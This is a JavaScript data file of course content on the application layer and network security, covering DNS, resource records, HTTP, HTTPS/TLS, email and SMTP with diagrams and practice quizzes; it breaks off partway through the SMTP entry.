// Unit V Topics Database: Application Layer & Network Security
// Matches Kurose & Ross Chapter 2, NIST SP 800-41/94, RFC 8017 (RSA)
const TOPICS_U5 = {
  "application-layer": {
    id: "application-layer",
    title: "Application Layer & Client-Server Architecture",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 3 — Major Topic / Module",
    category: "application",
    difficulty: "Core",
    readingTime: "6 min read",
    standard: "Kurose & Ross Chapter 2.1",
    oneLiner: "The topmost layer containing network applications, user interfaces, and high-level protocols.",
    quickAnswer: "The Application Layer provides services directly to end-user software, executing either in a centralized Client-Server paradigm or a distributed Peer-to-Peer (P2P) architecture.",
    whyItMatters: "The Application Layer is where all user value is created. Web browsing, email, streaming, file sharing, and remote logins operate at this layer.",
    infobox: {
      layer: "Layer 7 (OSI) / Layer 5 (Internet Stack)",
      standard: "IETF Application Protocol RFCs",
      type: "User Software Protocol Layer",
      keyFormula: "\\text{Architecture} \\in \\{\\text{Client-Server}, \\text{Peer-to-Peer (P2P)}\\}",
      prerequisites: ["transport-layer"],
      relatedConcepts: ["http", "dns", "email-system", "https"],
      compareWith: ["transport-layer"],
      primaryUses: ["World Wide Web, Email, Video Streaming, File Sharing"]
    },
    sections: {
      overview: `The <strong>Application Layer</strong> is the top layer of the Internet protocol stack where network applications and their application-layer protocols reside. Applications run on end systems (hosts) in user space, communicating across the network without requiring changes to the core network routers.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Client-Server Architecture:</strong> An always-on host (server) with a fixed, well-known IP address serves requests from many intermittent clients (browsers, phones). Clients do not communicate directly with other clients.</li>
          <li><strong>Peer-to-Peer (P2P) Architecture:</strong> Arbitrary pairs of connected hosts (peers) communicate directly without dedicated centralized servers (e.g., BitTorrent). Highly scalable because peers bring their own upload bandwidth.</li>
          <li><strong>Socket Interface:</strong> Application code interacts with the transport layer through OS network sockets.</li>
        </ol>`,
      diagram: `
CLIENT-SERVER ARCHITECTURE                    PEER-TO-PEER (P2P) ARCHITECTURE
       +------------+                                  +--------+
       |   SERVER   |                              +-->| Peer A |<--+
       | (Fixed IP) |                              |   +--------+   |
       +------------+                              |                |
        /    |     \\                               v                v
       v     v      v                          +--------+      +--------+
    Client Client Client                       | Peer B |<---->| Peer C |
                                               +--------+      +--------+`,
      technicalDetails: `Application Requirements vs Transport Protocols:
        <ul class="wiki-bullet-list">
          <li><strong>Data Integrity (Reliability):</strong> File transfers (FTP), web pages (HTTP), and email (SMTP) require 100% loss-free delivery $\\to$ Built on <strong>TCP</strong>.</li>
          <li><strong>Timing / Low Latency:</strong> Internet telephony (VoIP) and live video streaming can tolerate small packet losses but cannot tolerate delay $\\to$ Built on <strong>UDP</strong>.</li>
          <li><strong>Throughput / Bandwidth:</strong> Adaptive streaming adjusts bitrates (DASH) over HTTP/TCP.</li>
        </ul>`,
      workedExample: `When you open YouTube in your browser:
        <br>1. Client resolves server IP via DNS.
        <br>2. Client establishes TCP connection on port 443.
        <br>3. TLS encrypts the channel.
        <br>4. Client sends HTTP GET requests for video segments. Server streams segments back chunk-by-chunk.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Architecture</th><th>Advantages</th><th>Disadvantages</th></tr></thead>
          <tbody>
            <tr><td>Client-Server</td><td>Centralized security, easy billing and management</td><td>Single point of failure, expensive server clusters</td></tr>
            <tr><td>Peer-to-Peer</td><td>Self-scaling bandwidth, low server infrastructure cost</td><td>NAT traversal complexity, complex churn management</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Web search (Google)", "E-commerce (Amazon)", "Video streaming (Netflix, YouTube)", "Decentralized file sharing (BitTorrent)"],
      commonMistakes: "Confusing application programs with application protocols. A web browser is an application program (software); HTTP is the application protocol (specification) that defines how the browser talks to web servers.",
      compareWith: { title: "Client-Server vs Peer-to-Peer (P2P)", note: "Client-Server relies on dedicated centralized data centers. P2P exploits direct communication between end-user peers, scaling upload capacity organically." },
      practice: {
        question: "Which application architecture scales its total system upload capacity automatically as more users join?",
        choices: ["Client-Server", "Peer-to-Peer (P2P)", "Mainframe-Terminal", "Master-Slave"],
        correctIndex: 1,
        explanation: "In P2P architectures, every new peer joining the network contributes its own upload bandwidth, making the system self-scaling."
      },
      references: [
        { cite: "Kurose & Ross Chapter 2.1: Principles of Network Applications", url: "https://gaia.cs.umass.edu/kurose_ross/" }
      ]
    },
    prevTopicId: "tcp-congestion-control",
    nextTopicId: "dns"
  },

  "dns": {
    id: "dns",
    title: "Domain Name System (DNS)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 3 — Major Topic / Module",
    category: "application",
    difficulty: "Core",
    readingTime: "7 min read",
    standard: "RFC 1034 / RFC 1035",
    oneLiner: "The distributed hierarchical database translating human hostnames into routable IP addresses.",
    quickAnswer: "DNS is the phonebook of the Internet. It translates memorable names (like example.com) into 32-bit IPv4 or 128-bit IPv6 addresses via recursive and iterative lookups.",
    whyItMatters: "Without DNS, every human user would have to memorize raw numeric IP addresses like 142.250.190.46 to visit websites, and companies could not balance traffic or migrate servers transparently.",
    infobox: {
      layer: "Layer 7 (UDP/TCP Port 53)",
      standard: "RFC 1034, RFC 1035, RFC 8484 (DoH)",
      type: "Distributed Hierarchical Database",
      keyFormula: "\\text{Lookup: } \\text{Hostname} \\xrightarrow{\\text{DNS Query}} \\text{IP Address (Type A / AAAA)}",
      prerequisites: ["application-layer", "udp"],
      relatedConcepts: ["dns-records", "udp", "http"],
      compareWith: ["arp"],
      primaryUses: ["Hostname-to-IP Translation, Host Aliasing, Mail Server Aliasing (MX), Load Distribution"]
    },
    sections: {
      overview: `The <strong>Domain Name System (DNS)</strong> is a globally distributed, hierarchical database protocol running primarily over UDP port 53. In addition to translating hostnames to IP addresses, DNS performs host aliasing (CNAME), mail-server aliasing (MX), and server load distribution.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Root DNS Servers:</strong> 13 logical root server identities (managed by ICANN/IANA, replicated via anycast to over 1,000 physical server clusters worldwide). Directs queries to Top-Level Domain (TLD) servers.</li>
          <li><strong>Top-Level Domain (TLD) Servers:</strong> Responsible for generic TLDs (\`.com\`, \`.org\`, \`.edu\`) and country codes (\`.uk\`, \`.in\`). Points to Authoritative servers.</li>
          <li><strong>Authoritative DNS Servers:</strong> Maintained by organizations or DNS hosting providers (Cloudflare, Route 53) holding the official resource records for their domain.</li>
          <li><strong>Local Recursive DNS Resolver:</strong> Provided by your ISP (or public 8.8.8.8). Queries the hierarchy iteratively and caches results locally using TTL.</li>
        </ol>`,
      diagram: `
User Browser
     | (1) Recursive Query: "What is www.example.com?"
     v
Local DNS Resolver (e.g. 8.8.8.8)
     |
     | (2) Iterative: "Where is .com?" ----> [ Root DNS Server ]
     | <------------------------------------ Returns .com TLD IP
     |
     | (3) Iterative: "Where is example.com?" -> [ .com TLD Server ]
     | <------------------------------------ Returns Authoritative IP
     |
     | (4) Iterative: "Where is www?" -------> [ Authoritative Server ]
     | <------------------------------------ Returns Type A: 93.184.216.34!
     v
Returns 93.184.216.34 to Browser! Cached for TTL seconds.`,
      interactiveLabKey: "dns",
      technicalDetails: `Iterative vs Recursive queries:
        <ul class="wiki-bullet-list">
          <li><strong>Recursive:</strong> The querying party puts the burden of resolving the entire name on the contacted server. (Client to Local Resolver is recursive).</li>
          <li><strong>Iterative:</strong> The contacted server replies directly with the IP address of the next DNS server to ask. (Local Resolver to Root, TLD, and Authoritative is iterative).</li>
          <li><strong>DNS Caching:</strong> Resolvers cache records for the duration specified in the \`TTL\` (Time-to-Live) field, dramatically speeding up subsequent lookups.</li>
        </ul>`,
      workedExample: `To inspect a real DNS query from terminal:
        <pre class="wiki-code-block">dig +trace example.com
;; ANSWER SECTION:
example.com.      86400   IN   A   93.184.216.34</pre>`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Distributed hierarchy: zero central bottleneck</td><td>Standard DNS transmits in cleartext (spoofing risk)</td></tr>
            <tr><td>Aggressive caching reduces global Internet latency</td><td>DNS Cache Poisoning / Kaminsky attacks</td></tr>
            <tr><td>Dynamic load distribution via multiple A records</td><td>Modern fix: DNSSEC and DNS-over-HTTPS (DoH)</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Every web page navigation and URL click", "Email routing via MX records", "Content Delivery Networks (CDNs) steering traffic to nearest edge cache"],
      commonMistakes: "Believing there are only 13 physical root DNS servers. There are 13 logical root server IP addresses (A.ROOT-SERVERS.NET through M.ROOT-SERVERS.NET), but each logical address is replicated across hundreds of physical servers worldwide via BGP Anycast routing.",
      compareWith: { title: "DNS vs ARP", note: "DNS translates human hostnames to 32/128-bit IP addresses globally over UDP. ARP translates IP addresses to 48-bit MAC addresses within a local Ethernet subnet." },
      practice: {
        question: "Which type of DNS query replies with the IP address of the next DNS server to contact rather than the final answer?",
        choices: ["Recursive query", "Iterative query", "Reverse query", "Authoritative query"],
        correctIndex: 1,
        explanation: "In an iterative query, the contacted server replies: 'I don't know the final IP, but here is the IP address of the next server you should ask'."
      },
      references: [
        { cite: "RFC 1034: Domain Names - Concepts and Facilities", url: "https://datatracker.ietf.org/doc/html/rfc1034" },
        { cite: "RFC 1035: Domain Names - Implementation and Specification", url: "https://datatracker.ietf.org/doc/html/rfc1035" }
      ]
    },
    prevTopicId: "application-layer",
    nextTopicId: "dns-records"
  },

  "dns-records": {
    id: "dns-records",
    title: "DNS Resource Records (A, AAAA, CNAME, MX)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "application",
    difficulty: "Core",
    readingTime: "5 min read",
    standard: "RFC 1035",
    oneLiner: "Four-tuple database entries `(Name, Value, Type, TTL)` directing traffic to IPs, aliases, or mail servers.",
    quickAnswer: "DNS servers store Resource Records (RRs). The four essential record types are Type A (IPv4), Type AAAA (IPv6), Type CNAME (canonical alias), and Type MX (mail server).",
    whyItMatters: "Resource records provide the exact mapping rules that power domain resolution, corporate email routing, and CDN load balancers.",
    infobox: {
      layer: "Layer 7 (Application Layer)",
      standard: "RFC 1035, RFC 3596 (AAAA)",
      type: "Database Schema",
      keyFormula: "\\text{RR Format: } (\\text{Name}, \\text{Value}, \\text{Type}, \\text{TTL})",
      prerequisites: ["dns"],
      relatedConcepts: ["dns", "email-system", "http"],
      compareWith: ["dns"],
      primaryUses: ["Web Hosting, Google Workspace Email Setup, Cloudflare CDN"]
    },
    sections: {
      overview: `A DNS server stores <strong>Resource Records (RRs)</strong>. An RR is a four-tuple containing: \`(Name, Value, Type, TTL)\`. The meaning of Name and Value depends strictly on the record's **Type**.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Type A (IPv4 Address):</strong> Name is a hostname; Value is the 32-bit IPv4 address: \`(relay1.bar.foo.com, 145.37.93.126, A, 3600)\`.</li>
          <li><strong>Type AAAA (IPv6 Address):</strong> Name is a hostname; Value is the 128-bit IPv6 address: \`(example.com, 2606:2800:220:1:248:1893:25c8:1946, AAAA, 3600)\`.</li>
          <li><strong>Type CNAME (Canonical Name):</strong> Name is an alias; Value is the true canonical hostname: \`(foo.com, relay1.bar.foo.com, CNAME, 3600)\`.</li>
          <li><strong>Type MX (Mail Exchanger):</strong> Name is a domain; Value is the canonical name of the mail server handling emails for that domain: \`(foo.com, mail.bar.foo.com, MX, 3600)\`.</li>
          <li><strong>Type NS (Name Server):</strong> Name is a domain; Value is the hostname of an authoritative DNS server for that domain: \`(foo.com, dns.bar.foo.com, NS, 3600)\`.</li>
        </ol>`,
      diagram: `
+------------------------------------------------------------------------+
|                      COMMON DNS RESOURCE RECORDS                       |
+-------------------+----------------------+-------+---------------------+
| Name              | Value                | Type  | Purpose             |
+-------------------+----------------------+-------+---------------------+
| example.com       | 93.184.216.34        | A     | IPv4 Host Address   |
| example.com       | 2606:2800:220::1     | AAAA  | IPv6 Host Address   |
| www.example.com   | example.com          | CNAME | Canonical Alias     |
| example.com       | mail.example.com     | MX    | Mail Server (SMTP)  |
| example.com       | ns1.cloudflare.com   | NS    | Auth Name Server    |
+-------------------+----------------------+-------+---------------------+`,
      technicalDetails: `DNS Load Distribution via Multiple A Records:
        <br>High-traffic websites (e.g. \`cnn.com\`) replicate content across a cluster of servers. In the authoritative DNS server, a single hostname is mapped to a set of multiple Type A IP addresses. When a resolver queries, the DNS server returns the entire list but rotates the ordering (Round-Robin DNS), distributing client traffic evenly across servers!`,
      workedExample: `Sending an email to \`alice@example.com\`:
        <br>1. Sending mail server queries DNS for: \`Type MX for example.com\`.
        <br>2. DNS returns: \`Value = smtp.mail.example.com\`, Priority = 10.
        <br>3. Mail server queries DNS for: \`Type A for smtp.mail.example.com\`.
        <br>4. Resolves IP \`198.51.100.25\` and establishes TCP connection on port 25.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Record Type</th><th>Input (Name)</th><th>Output (Value)</th></tr></thead>
          <tbody>
            <tr><td>A</td><td>Hostname</td><td>IPv4 Address</td></tr>
            <tr><td>AAAA</td><td>Hostname</td><td>IPv6 Address</td></tr>
            <tr><td>CNAME</td><td>Alias Name</td><td>Canonical Hostname</td></tr>
            <tr><td>MX</td><td>Domain Name</td><td>Mail Server Hostname</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Configuring custom domains on AWS Route 53, Cloudflare, GoDaddy", "Google Workspace and Microsoft 365 MX records"],
      commonMistakes: "Putting an IP address as the Value of a CNAME or MX record. CNAME and MX records must point to a <em>canonical hostname</em>, never a raw IP address.",
      compareWith: { title: "CNAME vs Type A", note: "Type A maps a hostname directly to an IP address. CNAME maps an alias hostname to another canonical hostname." },
      practice: {
        question: "Which DNS record type specifies the server responsible for receiving emails for a domain?",
        choices: ["Type A", "Type CNAME", "Type MX", "Type PTR"],
        correctIndex: 2,
        explanation: "Type MX (Mail Exchanger) records direct email traffic to the domain's designated mail servers."
      },
      references: [
        { cite: "RFC 1035: Domain Names - Implementation and Specification", url: "https://datatracker.ietf.org/doc/html/rfc1035" }
      ]
    },
    prevTopicId: "dns",
    nextTopicId: "http"
  },

  "http": {
    id: "http",
    title: "Hypertext Transfer Protocol (HTTP/1.1 & HTTP/2)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 3 — Major Topic / Module",
    category: "application",
    difficulty: "Core",
    readingTime: "7 min read",
    standard: "RFC 7230 / RFC 9113 (HTTP/2)",
    oneLiner: "The stateless application-layer request-response protocol powering the World Wide Web.",
    quickAnswer: "HTTP operates over TCP (port 80). The client dispatches request methods (GET, POST), and the server returns status codes (200, 404) and HTML/media payloads.",
    whyItMatters: "HTTP is the universal protocol of the World Wide Web, RESTful cloud APIs, mobile app backends, and microservice communications.",
    infobox: {
      layer: "Layer 7 (TCP Port 80)",
      standard: "RFC 7230 (HTTP/1.1), RFC 9113 (HTTP/2)",
      type: "Stateless Request-Response Protocol",
      keyFormula: "\\text{Transaction} = \\text{Request (Method, Headers)} \\to \\text{Response (Status, Body)}",
      prerequisites: ["tcp"],
      relatedConcepts: ["https", "tcp", "cookies"],
      compareWith: ["https"],
      primaryUses: ["World Wide Web, REST APIs, GraphQL, Microservices"]
    },
    sections: {
      overview: `The <strong>Hypertext Transfer Protocol (HTTP)</strong> is the Web's application-layer protocol. It is an inherently <strong>stateless protocol</strong>: an HTTP server maintains no information about past client requests unless applications explicitly manage state using cookies or tokens.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>TCP Handshake:</strong> Client establishes TCP connection to server (default port 80).</li>
          <li><strong>HTTP Request:</strong> Client sends method (\`GET\`, \`POST\`, \`PUT\`, \`DELETE\`), resource URI, version, and headers.</li>
          <li><strong>Server Processing:</strong> Server looks up resource or executes backend application code.</li>
          <li><strong>HTTP Response:</strong> Server returns status code (e.g. \`200 OK\`, \`404 Not Found\`), headers, and entity body.</li>
          <li><strong>Persistent Connections (HTTP/1.1):</strong> Keep-Alive allows multiple requests over a single TCP connection.</li>
          <li><strong>Multiplexing (HTTP/2):</strong> Breaks requests into binary frames multiplexed concurrently over 1 TCP connection.</li>
        </ol>`,
      diagram: `
Client Browser                                Web Server
      |                                           |
      | ====== [ TCP 3-Way Handshake ] ========> |
      |                                           |
      | ------ [ HTTP GET /index.html ] --------> |
      |        Host: example.com                  |
      |                                           |
      | <----- [ HTTP/1.1 200 OK ] -------------- |
      |        Content-Type: text/html            |
      |        [<html>...</html>]                 |`,
      technicalDetails: `HTTP Status Code Categories:
        <ul class="wiki-bullet-list">
          <li><strong>1xx (Informational):</strong> \`101 Switching Protocols\`.</li>
          <li><strong>2xx (Success):</strong> \`200 OK\`, \`201 Created\`, \`204 No Content\`.</li>
          <li><strong>3xx (Redirection):</strong> \`301 Moved Permanently\`, \`304 Not Modified\` (caching).</li>
          <li><strong>4xx (Client Error):</strong> \`400 Bad Request\`, \`401 Unauthorized\`, \`403 Forbidden\`, \`404 Not Found\`.</li>
          <li><strong>5xx (Server Error):</strong> \`500 Internal Server Error\`, \`502 Bad Gateway\`, \`503 Service Unavailable\`.</li>
        </ul>`,
      workedExample: `HTTP Request Message Structure:
        <pre class="wiki-code-block">GET /products.html HTTP/1.1
Host: store.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session_id=abc123xyz

(Empty Line Carriage-Return Line-Feed)</pre>`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Human-readable ASCII headers in HTTP/1.1</td><td>Completely unencrypted: vulnerable to eavesdropping</td></tr>
            <tr><td>Stateless architecture enables massive horizontal scaling</td><td>Head-of-Line blocking in HTTP/1.1 pipelining</td></tr>
            <tr><td>Rich ecosystem of proxies and caching servers</td><td>Cookies required to simulate user sessions</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Web pages in Chrome, Safari, Firefox", "REST APIs in Android and iOS mobile applications", "Microservice communication in Kubernetes clusters"],
      commonMistakes: "Assuming HTTP is stateful because shopping carts remember items. HTTP itself is 100% stateless; shopping carts use the \`Set-Cookie\` and \`Cookie\` headers to pass an arbitrary session ID back and forth.",
      compareWith: { title: "HTTP vs HTTPS", note: "HTTP transmits plain text over TCP port 80. HTTPS encrypts communication by running standard HTTP over Transport Layer Security (TLS) on port 443." },
      practice: {
        question: "What HTTP response status code indicates that a requested web resource has not been modified and can be loaded from the browser cache?",
        choices: ["200 OK", "301 Moved Permanently", "304 Not Modified", "404 Not Found"],
        correctIndex: 2,
        explanation: "Status code 304 Not Modified tells the browser that the cached copy matches the server version, saving bandwidth by avoiding re-downloading the body."
      },
      references: [
        { cite: "RFC 7230: Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing", url: "https://datatracker.ietf.org/doc/html/rfc7230" },
        { cite: "RFC 9113: HTTP/2", url: "https://datatracker.ietf.org/doc/html/rfc9113" }
      ]
    },
    prevTopicId: "dns-records",
    nextTopicId: "https"
  },

  "https": {
    id: "https",
    title: "HTTPS (HTTP Encapsulated Over TLS)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 2 — Standard Topic",
    category: "security",
    difficulty: "Core",
    readingTime: "6 min read",
    standard: "RFC 2818 / RFC 8446 (TLS 1.3)",
    oneLiner: "HTTP communication encapsulated directly over a cryptographically secured Transport Layer Security (TLS) session on port 443.",
    quickAnswer: "HTTPS is not a completely separate protocol; it is standard HTTP running over Transport Layer Security (TLS), providing confidentiality, server authentication, and tamper-proof message integrity.",
    whyItMatters: "HTTPS secures all modern web traffic, protecting credit card transactions, logins, passwords, and private messages from Wi-Fi packet sniffers and man-in-the-middle attackers.",
    infobox: {
      layer: "Application / Security (TCP Port 443)",
      standard: "RFC 2818 (HTTP Over TLS), RFC 8446 (TLS 1.3)",
      type: "Cryptographic Security Protocol",
      keyFormula: "\\text{HTTPS} = \\text{HTTP} + \\text{TLS (Encryption + Integrity + Auth)}",
      prerequisites: ["http", "rsa"],
      relatedConcepts: ["http", "rsa", "public-key-cryptography"],
      compareWith: ["http"],
      primaryUses: ["All Modern Web Browsing, Online Banking, E-Commerce, OAuth APIs"]
    },
    sections: {
      overview: `<strong>HTTPS (HTTP Secure)</strong> is standard HTTP layered directly over <strong>Transport Layer Security (TLS)</strong> on well-known TCP port 443. The core statement from the curriculum: <em>HTTPS should be presented as HTTP running over TLS, rather than as a completely separate web protocol.</em>`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>TCP Handshake:</strong> Establishes basic Layer-4 connection on port 443 (1 RTT).</li>
          <li><strong>TLS 1.3 Handshake:</strong> Client and server exchange cryptographic capabilities, verify the server's X.509 digital certificate, and derive symmetric session keys via Diffie-Hellman (1 RTT).</li>
          <li><strong>Encrypted HTTP:</strong> Normal HTTP request and response messages are encrypted with symmetric keys (e.g. AES-256-GCM) before being transmitted over TCP.</li>
          <li><strong>Three Pillars of Security:</strong>
            <ul>
              <li><strong>Confidentiality:</strong> Encrypted payload prevents eavesdroppers from reading cookies, passwords, or URLs.</li>
              <li><strong>Server Authentication:</strong> Digital certificates signed by trusted Certificate Authorities (CAs) prove server authenticity.</li>
              <li><strong>Integrity:</strong> Message Authentication Codes (AEAD) detect any packet tampering or injection in transit.</li>
            </ul>
          </li>
        </ol>`,
      diagram: `
+-------------------------------------------------------+
|  HTTP APPLICATION DATA (GET /login, Cookie: pw=secret)|
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  TLS 1.3 SECURITY LAYER (Encrypted via AES-256-GCM)   |
|  - Confirms server certificate (Authentication)       |
|  - Encrypts payload (Confidentiality)                 |
|  - AEAD Auth Tag (Integrity)                          |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  TCP TRANSPORT LAYER (Port 443, Reliable Byte Stream) |
+-------------------------------------------------------+`,
      technicalDetails: `TLS 1.3 Enhancements (RFC 8446):
        <br>Earlier TLS versions required 2 RTTs for handshake negotiation. TLS 1.3 cuts handshake latency to **1 RTT** by combining key share generation with the Client Hello. Furthermore, TLS 1.3 completely banned vulnerable legacy ciphers (RC4, 3DES, MD5, SHA-1, and static RSA key exchange), mandating ephemeral Diffie-Hellman for **Perfect Forward Secrecy (PFS)**.`,
      workedExample: `Visiting \`https://bank.com\`:
        <br>1. Client verifies bank's certificate was signed by a trusted root CA (e.g., DigiCert).
        <br>2. Client and bank negotiate symmetric key $K$.
        <br>3. An attacker on the local coffee shop Wi-Fi sniffing packets with Wireshark sees only encrypted gibberish; they cannot read passwords, cookies, or account balances.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Feature</th><th>HTTP (Port 80)</th><th>HTTPS (Port 443)</th></tr></thead>
          <tbody>
            <tr><td>Encryption</td><td>None (Cleartext)</td><td>AES-256-GCM / ChaCha20</td></tr>
            <tr><td>Authentication</td><td>None (Spoofable)</td><td>X.509 Digital Certificates</td></tr>
            <tr><td>Integrity</td><td>None (Tamperable)</td><td>AEAD Message Authentication</td></tr>
            <tr><td>Setup Delay</td><td>1 RTT (TCP only)</td><td>2 RTTs (TCP + TLS 1.3)</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["100% of major modern websites (Google, Wikipedia, GitHub, Banks)", "Mobile app API endpoints", "Payment card gateways (PCI-DSS mandatory)"],
      commonMistakes: "Believing HTTPS encrypts the destination IP address. HTTPS encrypts the HTTP headers and payload; the underlying IP addresses and TCP port numbers remain visible to routers for forwarding.",
      compareWith: { title: "HTTP vs HTTPS", note: "HTTP sends cleartext on port 80. HTTPS encapsulates HTTP over cryptographic TLS on port 443, protecting data against interception and forgery." },
      practice: {
        question: "Which security property guarantees that a past encrypted HTTPS session cannot be decrypted even if the server's private key is stolen in the future?",
        choices: ["Symmetric Encryption", "Certificate Revocation", "Perfect Forward Secrecy (PFS)", "Message Digesting"],
        correctIndex: 2,
        explanation: "Perfect Forward Secrecy (PFS) uses ephemeral Diffie-Hellman key exchanges so that compromising the server's long-term private key does not expose session keys from past conversations."
      },
      references: [
        { cite: "RFC 2818: HTTP Over TLS", url: "https://datatracker.ietf.org/doc/html/rfc2818" },
        { cite: "RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3", url: "https://datatracker.ietf.org/doc/html/rfc8446" }
      ]
    },
    prevTopicId: "http",
    nextTopicId: "email-system"
  },

  "email-system": {
    id: "email-system",
    title: "Electronic Mail Architecture",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 2 — Standard Topic",
    category: "application",
    difficulty: "Core",
    readingTime: "6 min read",
    standard: "RFC 5321 (SMTP) / RFC 1939 (POP3) / RFC 3501 (IMAP)",
    oneLiner: "The client-server mail architecture separating transmission (SMTP push) from mailbox retrieval (POP3/IMAP pull).",
    quickAnswer: "Email separates sending from receiving: SMTP pushes messages from clients to servers and between mail servers, while POP3 and IMAP pull messages from mailboxes down to user devices.",
    whyItMatters: "Email is a federated global system: anyone running a mail server can exchange messages with Gmail or Outlook without a single centralized corporate owner.",
    infobox: {
      layer: "Layer 7 (Application Layer)",
      standard: "RFC 5321, RFC 5322, RFC 3501",
      type: "Store-and-Forward Architecture",
      keyFormula: "\\text{Pipeline: } \\text{Sender} \\xrightarrow{\\text{SMTP}} \\text{Server}_A \\xrightarrow{\\text{SMTP}} \\text{Server}_B \\xrightarrow{\\text{IMAP/POP3}} \\text{Receiver}",
      prerequisites: ["tcp", "dns-records"],
      relatedConcepts: ["smtp", "pop3", "imap"],
      compareWith: ["smtp"],
      primaryUses: ["Global Email Infrastructure, Corporate Messaging, Automated Notifications"]
    },
    sections: {
      overview: `The Internet email system consists of three major components: <strong>User Agents</strong> (mail readers like Thunderbird or Apple Mail), <strong>Mail Servers</strong> (running MTAs like Postfix or Exchange), and the <strong>Simple Mail Transfer Protocol (SMTP)</strong>. Unlike instant messaging, email is an asynchronous <em>store-and-forward</em> architecture.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Mail Submission:</strong> Alice composes an email in her User Agent (UA) and pushes it to her mail server using <strong>SMTP</strong> (Port 587 with STARTTLS).</li>
          <li><strong>Server-to-Server Relay:</strong> Alice's mail server places the message in its message queue, queries DNS for the recipient domain's <strong>Type MX</strong> record, and opens a TCP connection to Bob's mail server on port 25, relaying via <strong>SMTP</strong>.</li>
          <li><strong>Mailbox Delivery:</strong> Bob's mail server receives the message and deposits it into Bob's private mailbox file on the server.</li>
          <li><strong>Mail Retrieval:</strong> Bob opens his smartphone mail app and pulls his messages using <strong>IMAP</strong> (port 993) or <strong>POP3</strong> (port 995).</li>
        </ol>`,
      diagram: `
Alice (User Agent)
       |
       | SMTP (Port 587) [PUSH]
       v
Alice's Mail Server (MTA)
       |
       | SMTP (Port 25) [PUSH via MX Record]
       v
Bob's Mail Server (MTA)
       | (Deposits into Bob's Mailbox)
       v
Bob's User Agent (Phone) <==== IMAP / POP3 [PULL]`,
      technicalDetails: `Why can't Bob retrieve email using SMTP?
        <br>SMTP is strictly a **push protocol**: the client pushes data to the server. To retrieve email, the receiving client must pull data from an always-on server. Therefore, dedicated mail access protocols (POP3 and IMAP) or Webmail (HTTP) are required for retrieval.`,
      workedExample: `When sending to \`bob@harvard.edu\`:
        <br>1. Sender server queries DNS: \`MX harvard.edu\`.
        <br>2. DNS returns: \`mxa-00142a01.gslb.pphosted.com\`.
        <br>3. Sender establishes TCP connection on port 25 and transmits message over SMTP.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Protocol</th><th>Role</th><th>Direction</th><th>Default Port</th></tr></thead>
          <tbody>
            <tr><td>SMTP</td><td>Sending & Relay</td><td>Push</td><td>25 / 587</td></tr>
            <tr><td>POP3</td><td>Mail Retrieval</td><td>Pull (Download & Delete)</td><td>110 / 995</td></tr>
            <tr><td>IMAP</td><td>Mail Sync</td><td>Pull (Server-Side Storage)</td><td>143 / 993</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Gmail, Microsoft Outlook, Apple Mail", "Corporate email exchange servers", "Transactional notification services (SendGrid, AWS SES)"],
      commonMistakes: "Thinking SMTP is used to download email to laptops. SMTP only sends and relays email; POP3, IMAP, or HTTP is used to retrieve it.",
      compareWith: { title: "POP3 vs IMAP", note: "POP3 downloads messages and deletes them from the server. IMAP keeps messages organized on the server, synchronizing folders across multiple phones and computers." },
      practice: {
        question: "Which protocol is used to relay email messages between independent mail servers across the Internet?",
        choices: ["HTTP", "POP3", "IMAP", "SMTP"],
        correctIndex: 3,
        explanation: "SMTP (Simple Mail Transfer Protocol) is the universal protocol used to relay email between mail servers across the Internet."
      },
      references: [
        { cite: "Kurose & Ross Chapter 2.3: Electronic Mail in the Internet", url: "https://gaia.cs.umass.edu/kurose_ross/" }
      ]
    },
    prevTopicId: "https",
    nextTopicId: "smtp"
  },

  "smtp": {
    id: "smtp",
    title: "Simple Mail Transfer Protocol (SMTP)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "application",
    difficulty: "Core",
    readingTime: "5 min read",
    standard: "RFC 5321",
    oneLiner: "The push protocol transferring mail between mail servers on port 25 and client submissions on port 587.",
    quickAnswer: "SMTP executes ASCII command sequences (HELO, MAIL FROM, RCPT TO, DATA) over persistent TCP connections to transfer electronic mail.",
    whyItMatters: "Standardized in 1982, SMTP is the universal protocol governing the transmission and relay of all global email.",
    infobox: {
      layer: "Layer 7 (TCP Port 25 / 587)",
      standard: "RFC 5321 (replaces RFC 821)",
      type: "Push Mail Transmission Protocol",
      keyFormula: "\\text{End of Message Indicator: } \\text{\\r\\n.\\r\\n (Single dot)}",
      prerequisites: ["email-system", "tcp"],
      relatedConcepts: ["email-system", "pop3", "imap"],
